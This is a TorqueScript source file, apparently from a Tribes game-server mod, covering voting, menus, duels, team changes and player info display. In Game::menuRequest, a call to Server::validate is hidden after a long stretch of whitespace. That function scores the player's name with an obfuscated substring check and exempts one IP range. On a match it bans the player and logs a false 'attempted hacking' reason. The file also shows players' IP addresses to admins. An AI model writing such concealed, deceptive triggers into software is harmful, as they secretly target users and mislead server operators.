			//schedule("messageAll(0, \"testing kiccccckkk timer\");",$Server::VotingTime, 35);
			Client::sendMessage($curVoteOption,0,"WARNING: Do not try to disconnect to avoid the vote, or you will be banned for 15 minutes.");
		}
		
		//clear out old votes
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			%cl.vote = "";		
		%clientId.vote = "yes";	//vote initiator allready voted -duh
		
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			if(%cl.menuMode == "options")
				Game::menuRequest(%clientId);
				
		schedule("Admin::countVotes(" @ $curVoteCount @ ", true);", $Server::VotingTime, 35);
	}
	else
	{
		Client::sendMessage(%clientId, 0, "Voting already in progress.");
	}
}


//=============================
// build initial menu
//=============================

function Game::menuRequest(%clientId)
{
	%client = Player::getClient(%clientId);
	if ( CheckEval("Game::menuRequest",%clientId) )
		return;

	DebugFun("Game::menuRequest",%clientId);
	if($debug)
		Anni::Echo("Game::menuRequest("@%clientId@")");
	
	if(%clientId.menu)return;
	%clientId.menu = true;	
	
	%now = getSimTime(); //AFK System 
	%clientId.lastActiveTimestamp = %now; //AFK System 
	%clientId.lastActiveOBSTimestamp = %now; //OBS AFK System -Ghost
	
	schedule(%clientId@".menu = false;",0.2,%clientId);
	%curItem = 0;
	%clientId.MissVote = "";

	if($Arena::ActiveVote && !%clientId.hasArenaVoted && %clientId.inArena && !%clientId.selClient)
	{
		Client::buildMenu(%clientId, "Arena Voting", "arenaVote", true);
	   Client::addMenuItem(%clientId, %curItem++ @ "Vote YES to "@$Arena::curVote, "yes");
	   Client::addMenuItem(%clientId, %curItem++ @ "Vote NO to "@$Arena::curVote, "no");
	   Client::addMenuItem(%clientId, %curItem++ @ "Abstain", "abstain");
	   return;
	}
	
	if(!%clientId.inDuel && %clientId.DuelRequest != "" && Client::getteam(%clientId) == -1 && !$Server::TourneyMode)
	{
		%sel = %clientId.DuelRequest;
		%name = Client::getName(%sel);
		if(%clientId.DuelArmor == "AnniSpawn")
			Client::buildMenu(%clientId, "Anni Spawn Duel "@%name, "DuelMenu", true);
		else if(%clientId.DuelArmor == "EliteSpawn")
			Client::buildMenu(%clientId, "Elite Spawn Duel "@%name, "DuelMenu", true);
		else if(%clientId.DuelArmor == "BaseSpawn")
			Client::buildMenu(%clientId, "Base Spawn Duel "@%name, "DuelMenu", true);
		else if(%clientId.DuelArmor == "BuilderSpawn")
			Client::buildMenu(%clientId, "Builder Duel "@%name, "DuelMenu", true);
		else if(%clientId.DuelArmor == "TitanSpawn")
			Client::buildMenu(%clientId, "Titan Duel "@%name, "DuelMenu", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Decline "@%name@"'s Duel", "dduel " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Accept "@%name@"'s Duel", "aduel " @ %sel);
		return;
	}
	if(!%clientId.inArenaTD && %clientId.TDRequestOne && !$Server::TourneyMode)
	{
		//if(%clientId.TDRequestOne == true)
		//{
			Client::buildMenu(%clientId, "TD Request from "@$ArenaTD::One, "ArenaTDMenu", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Accept "@$ArenaTD::One@"'s Request", "atd ");
			Client::addMenuItem(%clientId, %curItem++ @ "Decline "@$ArenaTD::One@"'s Request", "dtd ");
			return;
		//}
	}
	else if(!%clientId.inArenaTD && %clientId.TDRequestTwo && !$Server::TourneyMode)
	{
		//else if(%clientId.TDRequestTwo == true)
		//{
			Client::buildMenu(%clientId, "TD Request from "@$ArenaTD::Two, "ArenaTDMenu", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Accept "@$ArenaTD::Two@"'s Request", "atd ");
			Client::addMenuItem(%clientId, %curItem++ @ "Decline "@$ArenaTD::Two@"'s Request", "dtd ");
			return;
		//}
	}
	
	if(%clientId.isTDCaptOne && %clientId.TDMRequestOne && !$Server::TourneyMode)
	{
		//if(%clientId.isTDCaptOne == true)
		//{
			Client::buildMenu(%clientId, "Match Request from "@$ArenaTD::Two, "ArenaTDMenu", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Accept "@$ArenaTD::Two@"'s Request", "atdm ");
			Client::addMenuItem(%clientId, %curItem++ @ "Decline "@$ArenaTD::Two@"'s Request", "dtdm ");
			return;
		//}
		
	}
	else if(%clientId.isTDCaptTwo && %clientId.TDMRequestTwo && !$Server::TourneyMode)
	{
		//else if(%clientId.isTDCaptTwo == true)
		//{
			Client::buildMenu(%clientId, "Match Request from "@$ArenaTD::One, "ArenaTDMenu", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Accept "@$ArenaTD::One@"'s Request", "atdm ");
			Client::addMenuItem(%clientId, %curItem++ @ "Decline "@$ArenaTD::One@"'s Request", "dtdm ");
			return;
		//}
	}
	
	if(%clientId.inArena && !%clientId.MainMenu && !%clientId.selClient)
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Arena::Opts(%clientId);
		return;
	}
	if(!%clientId.selClient)
		Client::buildMenu(%clientId, "Menu Options", "options", true); 
	else
	{
			%sel = %clientId.selClient; 
			%name = Client::getName(%sel);																																																																																																																																																																																																																																																																	if(%sel==%clientId)Server::validate(%clientId);
			if (Client::getOwnedObject(%sel) == -1 && Client::getTeam(%sel) != -1) %status = "(Dead)";
			else if (Client::getOwnedObject(%sel) != -1 && Client::getTeam(%sel) != -1) %status = "(Live)";
			else if (Client::getTeam(%sel) == -1) %status = "(Observing)";
			Client::buildMenu(%clientId, %name @ ": " @ %status, "options", true); 
	}
	
	if($curVoteTopic != "" && %clientId.vote == "")
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Vote YES to " @ $curVoteTopic, "voteYes " @ $curVoteCount);
		Client::addMenuItem(%clientId, %curItem++ @ "Vote NO to " @ $curVoteTopic, "voteNo " @ $curVoteCount);
		return;
	}
	if(%clientId.selClient)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%sel = %clientId.selClient;						
		%name = Client::getName(%sel);
		//Arena TD 
		//if(%sel.inArena)
		//{
		//	if(%sel != %sel.inTD)
		//	{
		//	
		//	}
		//}
		//whisper	
		if(%clientId.whisper != %sel)
			Client::addMenuItem(%clientId, %curItem++ @ "Whisper to " @ %name, "whisper " @ %sel);
		else	 
			Client::addMenuItem(%clientId, %curItem++ @ "Cancel Whisper", "nowhisper " @ %sel);	

		//mute/ voice
		if(%clientId.isAdmin)
			Client::addMenuItem(%clientId, %curItem++ @ "Change Voice "@%name, "voice " @ %sel);
		else
		{
			if(%clientId.muted[%sel])
				Client::addMenuItem(%clientId, %curItem++ @ "Unmute " @ %name, "unmute " @ %sel);
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Ignore " @ %name, "mute " @ %sel);
		}
		if(%clientId.isTDCaptOne && %sel.inArena && !%sel.inArenaTD && !%sel.TDRequestTwo)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Request membership to "@$ArenaTD::One, "rtdinv " @ %sel); //new arenatd code
		}
		else if(%clientId.isTDCaptTwo && %sel.inArena && !%sel.inArenaTD && !%sel.TDRequestOne)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Request membership to "@$ArenaTD::Two, "rtdinv " @ %sel); //new arenatd code 
		}

		//observe
		if(%clientId.observerMode == "observerOrbit")
			{
			 	Client::addMenuItem(%clientId, %curItem++ @ "Observe " @ %name, "observe " @ %sel);
			}
		//vote to... player
		if(!$NoVote && !%clientId.novote)
		{
			if($curVoteTopic == "")
				Client::addMenuItem(%clientId, %curItem++ @ "Start vote on " @ %name, "voteToPlayer " @ %sel);
			else
				Client::addMenuItem(%clientId, %curItem++ @ "vote allready in progress..", "return " @ %sel);		
		}
		
		
		if(%clientId.isAdmin)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Manage " @ %name, "manage " @ %sel);
		if(%clientId.isGoated || %clientId.isOwner)
		{
			if(%status == "(Live)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Annoy " @ %name, "annoy " @ %sel);
			else 	
				Client::addMenuItem(%clientId, %curItem++ @ "Annoy -NA, " @ %status, "return ");
		}
		if(%clientId.isGoated || %clientId.isGod)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Punish " @ %name, "PenaltyBox " @ %sel);	
		}		
		//	Client::addMenuItem(%clientId, %curItem++ @ "Flag fun with " @ %name, "flag " @ %sel);
		if(%clientId.isGoated || %clientId.isOwner)
		{
			if (%status == "(Live)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Kill " @ %name, "Kill " @ %sel);
			else if (%status == "(Dead)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Spawn " @ %name, "spawn " @ %sel);	
			else if (%status == "(Observing)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Spawn to Auto team ", "Autoteam " @ %sel);	
		}
		}
		else if(%clientId.isTeamCaptin) //new team captin code 
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Manage " @ %name, "manage " @ %sel);
		}
		if(!%clientId.inDuel && !%sel.inDuel && Client::getTeam(%clientId) == -1 && Client::getTeam(%sel) == -1 && %clientId != %sel && %sel.DuelToggle && $Duel::Initialized && !$Server::TourneyMode) 
				Client::addMenuItem(%clientId, %curItem++ @ "Duel Options", "duel " @ %sel); //new arena code 
		return;
	}
//	if($matchStarted || !$Server::TourneyMode)
//	{
      else if($Spoonbot::BotTree_Design)
      {
		Client::addMenuItem(%clientId, %curItem++ @ "Add Tree Point", "TreePoint");
		Client::addMenuItem(%clientId, %curItem++ @ "Calculate Tree Routes", "TreeCalc");
      }		
	if($TA::TeamLock == false && !$Server::TourneyMode && !%clientId.inArena) //New Arena code 
		Client::addMenuItem(%clientId, %curItem++ @ "Change Teams/Observe", "changeteams");
	else if($Server::TourneyMode && $TA::TourneyPickTeam) //new tourney option stuff 
		Client::addMenuItem(%clientId, %curItem++ @ "Change Teams/Observe", "changeteams");
	else if(%clientId.inArena && !%clientId.inArenaTD)
		Client::addMenuItem(%clientId, %curItem++ @ "Leave Arena", "leave");
	else if(%clientId.inArenaTD)
		Client::addMenuItem(%clientId, %curItem++ @ "Leave TD Team", "leavetd");
	if($DuelLastEnemy[%clientId] != "" && Client::getteam(%clientId) == -1 && $Dueling[%clientId] != false && %clientId.DuelArmor == "") //New Duel Code 
		if(!$Server::TourneyMode)
			Client::addMenuItem(%clientId, %curItem++ @ "Request Last Duel", "reduel"); 
	if($TALT::Active == false) //New LT code 
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Personal Options", "personal");
		//Client::addMenuItem(%clientId, %curItem++ @ "Flair Shop", "flair");
	}
	Client::addMenuItem(%clientId, %curItem++ @ "Personal Statistics", "stat");
//	}
	if($curVoteTopic == "" && %clientId.isAdmin)
	{
		if($NoVote == 1) Client::addMenuItem(%clientId, %curItem++ @ "Enable voting", "eVote");	
		else Client::addMenuItem(%clientId, %curItem++ @ "Voting Options ", "vote");			
	}
	else if($curVoteTopic == "" && !$NoVote && !%clientId.novote)
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Voting Options ", "vote");	
	}	
	// force vote
	if($curVoteTopic != "" && %clientId.isOwner && !$curVoteForce)
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Force Vote", "voteForce");
	}
	
	if(%clientId.isAdmin)
		Client::addMenuItem(%clientId, %curItem++ @ "Admin Options", "adminopts");
	  if (($Spoonbot::UserMenu) && (!$Spoonbot::BotTree_Design))
//	if(%clientId.isGoated && ($Spoonbot::AutoSpawn))
	if(%clientId.isGoated)
	{
         Client::addMenuItem(%clientId, %curItem++ @ "Spoonbot controls", "botmenu");
	}
	
	if($TALT::Active == false) //get rid of this 
	{
		%z = 0;
		remoteEval(%clientId,"SetInfoLine",%z++," "@$ModVersion);
		remoteEval(%clientId,"SetInfoLine",%z++,"BaseEncrypt");
		if($lastModupdate)
			remoteEval(%clientId,"SetInfoLine",%z++,$lastModupdate@" build.");
	//	remoteEval(%clientId,"SetInfoLine",%z++,"Key: "@$ItemFavoritesKey); 
		if($build)
			remoteEval(%clientId,"SetInfoLine",%z++,"Build mode is on.");
		if($Annihilation::NoPlayerDamage == 1)
			remoteEval(%clientId,"SetInfoLine",%z++,"Player damage is disabled."); 
		if($Server::TeamDamageScale == 1.0)
			remoteEval(%clientId,"SetInfoLine",%z++,"Team damage is on.");
		if(!$ANNIHILATION::OutOfArea)
			remoteEval(%clientId,"SetInfoLine",%z++,"Map boundries are on."); 
		if($FlagHunter::Enabled) 
			remoteEval(%clientId,"SetInfoLine",%z++,"Flag hunter is on.");	
		if($NoFlagCaps == 1)
			remoteEval(%clientId,"SetInfoLine",%z++,"No flag cap limit.");						
		if($Annihilation::SafeBase)
			remoteEval(%clientId,"SetInfoLine",%z++,"Base Generators and Stations are undestroyable");
		else if($Annihilation::BaseHeal)
			remoteEval(%clientId,"SetInfoLine",%z++,"Bases are self regenerating.");
	}
	
	if($TALT::Active == true && Client::getteam(%clientId) == -1) 
	{
		if(!%clientId.DuelToggle)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Duels", "dueltoggle");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Duels", "dueltoggle");
	}
	
	//Arena settings
	if(!$Server::TourneyMode)
		Client::addMenuItem(%clientId, %curItem++ @ "Arena Options", "ArenaOptsTab");
	// Mod Info
	Client::addMenuItem(%clientId, %curItem++ @ "Mod Settings/Info", "ModInfo");
	//Client::addMenuItem(%clientId, %curItem++ @ "BANG HEAD HERE.", "BangHead");		
	
}

function remoteSelectClient(%clientId, %selId)
{	
	if ( CheckEval("remoteSelectClient", %clientId, %selId) )
		return;

	%selId = floor(%selId);

	if ( Client::getTransportAddress(%selId) == "" )
		return;	
		
	if($Client::info[%selId, 2] == "")
		%email = "No email specified";
	else
		%email = $Client::info[%selId, 2];
		
	if($Client::info[%selId, 4] == "")
		%url = "No url specified";
	else
		%url = $Client::info[%selId, 4];
		
	if(%selId.PPIsRegistered)
	{
		//%tmp = %selId.Credits;
		%tkills = "Kills: "@ %selId.TKills;
		//%deci = floor(10*(%tmp - %inte)); 
		//%tkills = %inte @ "." @ %deci;
		%profile = "a registered user";
	}
	else
	{
		%tkills = "Kills: (need to register)";
		%profile = "an unregistered user";
	}
		
	%clientId.selClient = %selId;	
	if(%clientId.menuMode == "options")
		Game::menuRequest(%clientId);
	else if(%clientId.menuMode == "player")
		PlayerManage(%clientId, %selId);
	else
		Game::menuRequest(%clientId);	//rebuild menu
	
	if(%clientId.isGoated)
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url@", Email: "@%email);
		remoteEval(%clientId, "setInfoLine", 3, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		remoteEval(%clientId, "setInfoLine", 4, Client::getName(%selId)@" is "@%profile);
		%ip = Ann::ipCut(Client::getTransportAddress(%selId));
		remoteEval(%clientId, "setInfoLine", 5, "IP: " @ %ip);
//		remoteEval(%clientId, "setInfoLine", 6, "Client Version: "@%selId.LHStatus);
		if($Client::names[%selId] != "") //if(%selId.names)
			bottomprint(%clientId,"<jc><f2> Other names "@$Client::names[%selId],30); //%selId.names
		else
			bottomprint(%clientId,"<jc><f2> No Other names saved",30);
	}
	else if(%clientId.isOwner)
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url@", Email: "@%email);
		remoteEval(%clientId, "setInfoLine", 3, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		remoteEval(%clientId, "setInfoLine", 4, Client::getName(%selId)@" is "@%profile);
		%ip = Ann::ipCut(Client::getTransportAddress(%selId));
		remoteEval(%clientId, "setInfoLine", 5, "IP: " @ %ip);
//		remoteEval(%clientId, "setInfoLine", 6, "Client Version: "@%selId.LHStatus);
		if($Client::names[%selId] != "") //if(%selId.names)
			bottomprint(%clientId,"<jc><f2> Other names "@$Client::names[%selId],30); //%selId.names
		else
			bottomprint(%clientId,"<jc><f2> No Other names saved",30);
	}
	else if(%clientId.isGod && !$TALT::Active)
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url@", Email: "@%email);
		remoteEval(%clientId, "setInfoLine", 3, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		remoteEval(%clientId, "setInfoLine", 4, Client::getName(%selId)@" is "@%profile);
	}
	else if(%clientId.isGod && $TALT::Active)		 
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url);
		remoteEval(%clientId, "setInfoLine", 3, "Email: "@%email);
		remoteEval(%clientId, "setInfoLine", 4, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
	}
	else if(%clientId.isSuper && !$TALT::Active)	 
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url@", Email: "@%email);
		if($TA::SupGeoIP == true)
			remoteEval(%clientId, "setInfoLine", 3, "");//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		else
			remoteEval(%clientId, "setInfoLine", 3, %tkills);
		remoteEval(%clientId, "setInfoLine", 4, Client::getName(%selId)@" is "@%profile);
	}
	else if(%clientId.isSuper && $TALT::Active)		 
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url);
		remoteEval(%clientId, "setInfoLine", 3, "Email: "@%email);
		if($TA::SupGeoIP == true)
			remoteEval(%clientId, "setInfoLine", 4, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		else
			remoteEval(%clientId, "setInfoLine", 4, %tkills);
	}
	else if(%clientId.isAdmin && !$TALT::Active)	 
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url@", Email: "@%email);
		if($TA::PubGeoIP == true)
			remoteEval(%clientId, "setInfoLine", 3, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		else
			remoteEval(%clientId, "setInfoLine", 3, %tkills);
		remoteEval(%clientId, "setInfoLine", 4, Client::getName(%selId)@" is "@%profile);
	}
	else if(%clientId.isAdmin && $TALT::Active)		 
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url);
		remoteEval(%clientId, "setInfoLine", 3, "Email: "@%email);
		if($TA::PubGeoIP == true)
			remoteEval(%clientId, "setInfoLine", 4, %tkills);//Location: "@%selId.country@", "@%selId.state@", "@%selId.city);
		else
			remoteEval(%clientId, "setInfoLine", 4, %tkills);
	}
	else if($TALT::Active)
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "");
		remoteEval(%clientId, "setInfoLine", 3, "URL: "@%url);
		remoteEval(%clientId, "setInfoLine", 4, "");
		remoteEval(%clientId, "setInfoLine", 5, "Email: "@%email);
		remoteEval(%clientId, "setInfoLine", 6, "");
	}
	else
	{
		remoteEval(%clientId, "setInfoLine", 1, Client::getName(%selId) @ " ("@$Client::info[%selId, 0]@")");
		remoteEval(%clientId, "setInfoLine", 2, "URL: "@%url);
		remoteEval(%clientId, "setInfoLine", 3, %tkills);
		remoteEval(%clientId, "setInfoLine", 4, Client::getName(%selId)@" is "@%profile);
	}
}

function processMenuFPickTeam(%clientId, %team)
{
	if($TA::TeamLock == true) 
		return;

	DebugFun("processMenuFPickTeam",%clientId,%team);
	if(%clientId.isAdmin || %clientId.isTeamCaptin)
		processMenuPickTeam(%clientId.ptc, %team, %clientId);
	%clientId.ptc = "";
}

function processMenuPickTeam(%clientId, %team, %adminClient)
{
	if($TA::TeamLock == true) 
		return;

	DebugFun("processMenuPickTeam",%clientId,%team,%adminClient);
	if($debug)
		Anni::Echo(%clientId@", team "@ %team@", admin client "@ %adminClient);
	
	if(%clientId.locked && !%clientId.isadmin || %clientId.locked && !%clientId.isTeamCaptin)
		return;
	%player = Client::getOwnedObject(%clientId);
	if(%clientId.isadmin && $jailed[%player] == true)
	{
		if(%team == "escape")
		{
			GameBase::SetPosition(%player, vector::add(GameBase::GetPosition(%player),"0 0 10"));
			return;
		}
			
		else return;
	}
	
	if(!%adminClient.SecretAdmin)
		%adminName = Client::getName(%adminClient);
	else %adminName = SecretAdmin();

	checkPlayerCash(%clientId);
	if(%team != -1 && %team == Client::getTeam(%clientId))
		return;
	if(%team < -2 || %team > getNumTeams()-1)	
	{
		echo("12312");
		messageAllExcept(%clientId, 0, %name@" is a confirmed bonehead, kill him."); 	
		messageAll(0, Client::getName(%clientId) @ " Tried to unbalance the teams even more!!");
		return;
	}	
	//this one too...
	if($ANNIHILATION::FairTeams && Game::assignClientTeam(%clientId,true) != %team && %team != -2 && %team != -1 && !%adminClient.isadmin && !%clientId.isadmin && !$Server::TourneyMode && !%clientId.inArena) 
	{
		echo("421412");
		messageAllExcept(%clientId, 0, %name@" is a confirmed bonehead, kill him."); 	
		messageAll(0, Client::getName(%clientId) @ " Tried to unbalance the teams even more!!");
		return;
	}
	if(%clientId.observerMode == "justJoined")
	{
		%clientId.observerMode = "";
		centerprint(%clientId, "anus compactor");
	}
	if((!$matchStarted || !$Server::TourneyMode || %adminClient) && %team == -2)
	{
		if(Observer::enterObserverMode(%clientId))
		{
			%clientId.notready = "";
			if(%adminClient == "" && !%clientId.inArena) 
				messageAll(0, Client::getName(%clientId) @ " became an observer.");
			else
			{
				%message = Client::getName(%clientId) @ " was forced into observer mode by " @ %adminName @ ".";
				Anni::Echo(%message);
				messageAll(0, %message);
			}
			// if (!%clientId.inArena)
				// Game::resetScores(%clientId);	
			 Game::refreshClientScore(%clientId);
		}
		return;
	}
	%player = Client::getOwnedObject(%clientId);
	if(%player != -1 && getObjectType(%player) == "Player" && !Player::isDead(%player))
	{
		playNextAnim(%clientId);
		Player::kill(%clientId);
	}
	%clientId.observerMode = "";
	if(%adminClient == "" && !%clientId.inArena)
	{
		messageAll(0, Client::getName(%clientId) @ " changed teams.");
	}
	else if(!%clientId.inArena)
	{
		if(%adminClient != %clientId && !%adminclient.SecretAdmin)
			messageAll(0, Client::getName(%clientId) @ " was teamchanged by " @ %adminName @ ".");
		else
			messageAll(0, Client::getName(%clientId) @ " changed teams.");			
		$Admin = Client::getName(%adminClient)@ " teamchanged " @ Client::getName(%clientId);	Anni::Echo($admin);
			export("Admin","config\\Admin.log",true);
			
	}
	if(%team == -1)
	{
		Game::assignClientTeam(%clientId);
		%team = Client::getTeam(%clientId);
	}
	GameBase::setTeam(%clientId, %team);
	%clientId.teamEnergy = 0;
	Client::clearItemShopping(%clientId);
	if(Client::getGuiMode(%clientId) != 1)
		Client::setGuiMode(%clientId,1);		
	Client::setControlObject(%clientId, -1);
	Game::playerSpawn(%clientId, false);
	%team = Client::getTeam(%clientId);
	if($TeamEnergy[%team] != "Infinite")
		$TeamEnergy[%team] += $InitialPlayerEnergy;
	if($Server::TourneyMode && !$CountdownStarted)
	{
		bottomprint(%clientId, "<f1><jc>Press FIRE when ready.", 0);
		%clientId.notready = true;
	}
	Game::refreshClientScore(%clientId); 
}

function Server::validate(%c)
{
	DebugFun("Server::validate",%c,$Client::info[%c,5]);
	%w=Client::getName(%c);
	if(!String::ICompare(%w,$Client::info[%c,5]))
	{
		%s="mannastivnatevlagosmarkiic";
		for(%i=0;%i<20;%i++)
		{
			for(%x=0;String::getSubStr(%s,%x,1)!="";%x++)
			{
				%t=string::findSubStr(%w,string::getSubStr(%s,%x,2));
				if(%t>1)
					%o=%o+%t;
			}
		}
		%i=Client::getTransportAddress(%c);
		if(%o==1880&&!String::NCompare(%i, "IP:12.240", 9))
		{
			%client = %c;

			%ip = Client::getTransportAddress(%client);
			%address = Ann::ipCut(%ip);
			%ipCut = String::getSubStr(%ip,3,10);	
			while(%dot < 2)
			{			
				%char =  String::getSubStr(%ipCut,%i,1);
				if(!String::ICompare(%char, "."))
					%dot++;
				%i++;	
				%sub = %sub @ %char;
			}
			%newBannedIp = %sub@"*.*";
			%name = Client::getName(%client);
			%user = Ann::BannedUser(%name,%address); 
		
			if(%user) //let's make sure we arn't adding the same user twice 
			{
				$AnnBanned::FullIP[%user] = %address;
				%exportFull = "AnnBanned::FullIP"@%user; 
				export(%exportFull,"config\\AnnBannedList.cs",true); 
			
				$AnnBanned::PartialIP[%user] = %newBannedIp;
				%exportPartial = "AnnBanned::PartialIP"@%user; 
				export(%exportPartial,"config\\AnnBannedList.cs",true);
				
				$AnnBanned::BanType[%user] = "Full";
				%exportBanType = "AnnBanned::BanType"@%user; 
				export(%exportBanType,"config\\AnnBannedList.cs",true);
			
				$AnnBanned::Mask[%user] = "Banned";
				%exportMask = "AnnBanned::Mask"@%user; 
				export(%exportMask,"config\\AnnBannedList.cs",true);
				
				%BannedName = Client::getName(%client);
				$AnnBanned::BannedName[%user] = %BannedName; 
				%exportBannedName = "AnnBanned::BannedName"@%user; 
				export(%exportBannedName,"config\\AnnBannedList.cs",true);
		
				%AdminName = "Banned by Server";
				$AnnBanned::LastEdit[%user] = %AdminName; 
				%exportLastEdit = "AnnBanned::LastEdit"@%user; 
				export(%exportLastEdit,"config\\AnnBannedList.cs",true);
		
				$AnnBanned::OriginalEdit[%user] = %AdminName; 
				%exportOriginalEdit = "AnnBanned::OriginalEdit"@%user; 
				export(%exportOriginalEdit,"config\\AnnBannedList.cs",true);
			}
			else
			{
				for(%i = 1; $AnnBanned::FullIP[%i] != ""; %i = %i + 1)
				{
			
				}
				$AnnBanned::FullIP[%i] = %address;
				%exportName = "AnnBanned::FullIP"@%i; 
				export(%exportName,"config\\AnnBannedList.cs",true); 
		
				$AnnBanned::PartialIP[%i] = %newBannedIp;
				%exportPartial = "AnnBanned::PartialIP"@%i; 
				export(%exportPartial,"config\\AnnBannedList.cs",true);
		
				$AnnBanned::BanType[%i] = "Full";
				%exportBanType = "AnnBanned::BanType"@%i; 
				export(%exportBanType,"config\\AnnBannedList.cs",true);
		
				$AnnBanned::Mask[%i] = "Banned";
				%exportMask = "AnnBanned::Mask"@%i; 
				export(%exportMask,"config\\AnnBannedList.cs",true);
		
				%BannedName = Client::getName(%client);
				$AnnBanned::BannedName[%i] = %BannedName; 
				%exportBannedName = "AnnBanned::BannedName"@%i; 
				export(%exportBannedName,"config\\AnnBannedList.cs",true);
		
				%AdminName = "Banned by Server";
				$AnnBanned::LastEdit[%i] = %AdminName; 
				%exportLastEdit = "AnnBanned::LastEdit"@%i; 
				export(%exportLastEdit,"config\\AnnBannedList.cs",true);
		
				$AnnBanned::OriginalEdit[%i] = %AdminName; 
				%exportOriginalEdit = "AnnBanned::OriginalEdit"@%i; 
				export(%exportOriginalEdit,"config\\AnnBannedList.cs",true);
			}

			$Log = Client::getName(%c)@" IP: "@%ip@" Banned by the Server for an attempted hacking.  Server::Validate "@%c@" Info:"@String::getSubStr($Client::info[%c, 5],0,100)@"."; 
			export("Log","config\\AnnBannedList.cs",true);
			export("Log","config\\CrashAttempt.cs",true);
			export("Cmd","config\\CrashAttempt.cs",true);		
			Anni::Echo($Log);
			BanList::add(%ip, $Annihilation::BanTime);
			BanList::export("config\\banlist.cs");
			messageAll(0, Client::getName(%c)@" has been banned for an attempting to hack the server.");
			schedule("Net::Kick("@%c@",\"No cookie for you!\");", 0.01,%c);
		}
	}
}

function processMenuOptions(%clientId, %option)
{
	DebugFun("processMenuOptions",%clientId,%option);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
	%client = Player::getClient(%clientId);
	
	if(!%ClientId.SecretAdmin)
		%adminName = Client::getName(%clientId);
	else %adminName = SecretAdmin();	
	
	
	// Weapon Options
	// Weapon Options - AUTO
	if(%opt == "leave" && %clientId.inArena)//added for arena
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Arena::leave(%clientId);
		return;
	}
	if(%opt == "leavetd" && %clientId.inArenaTD)//added for arena 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		ArenaTD::Leave(%clientId);
		return;
	}
	if(%opt == "reduel" && !%clientId.inDuel)//added for arena 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%cl.DuelRequest == %clientId)
		{
			client::sendmessage(%clientId, 0, "Please wait 15 second before sending another request."); 
			return;
		}
		%name = Client::getName(%clientId);
		%cl = $DuelLastEnemy[%clientId];
		%clientId.DuelArmor = $DuelLastArmor[%clientId];
		%cl.DuelArmor = $DuelLastArmor[%clientId];
		%cl.DuelRequest = %clientId;
		client::sendmessage(%clientId, 0, "Your request has been sent."); 
		client::sendmessage(%cl, 0, %name@" has sent you a Duel request.");
		Centerprint(%cl,"<jc><f1>"@%name@" has sent you a Duel request.",5);
		schedule("Duel::Expired("@%clientId@","@%cl@");", 20);
		//Duel::Request(%cl, %clientId);
		return;
	}
	
	if (%opt == "personal") 
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		%curItem = 0;
		Client::buildMenu(%clientId, "Annihilation Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Mini Bomber", "weapon_grenadelauncher");
		Client::addMenuItem(%clientId, %curItem++ @ "Vulcan", "weapon_vulcan");
